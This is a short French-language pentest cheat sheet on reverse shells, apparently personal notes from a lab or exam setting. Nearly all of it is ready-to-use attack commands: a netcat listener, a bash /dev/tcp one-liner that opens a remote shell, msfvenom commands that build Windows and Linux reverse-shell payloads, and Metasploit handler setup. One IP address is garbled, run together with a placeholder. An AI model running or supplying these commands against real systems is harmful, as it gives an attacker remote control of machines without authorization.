---
description: nc -lvp <PORT>
---

# Reverse-shell

### Bash

```
bash -i >& /dev/tcp/192.168.119.164<IP>/<PORT> 0>&1
```

### MSFVenom

```
# Fonctionne avec netcat
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell_reverse_tcp.exe (c'est du 32 bits)

# Fonctionne avec msfconsole
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
msf> use exploit/multi/handler
msf> set payload linux/x86/meterpreter/reverse_tcp
```

Pour obtenir une session `Powershell` dans un _reverse-shell_ `msfvenom`, il faut taper la commande suivante :&#x20;

```
powershell.exe

# Importer un module
Import-Module .\module.ps1
```
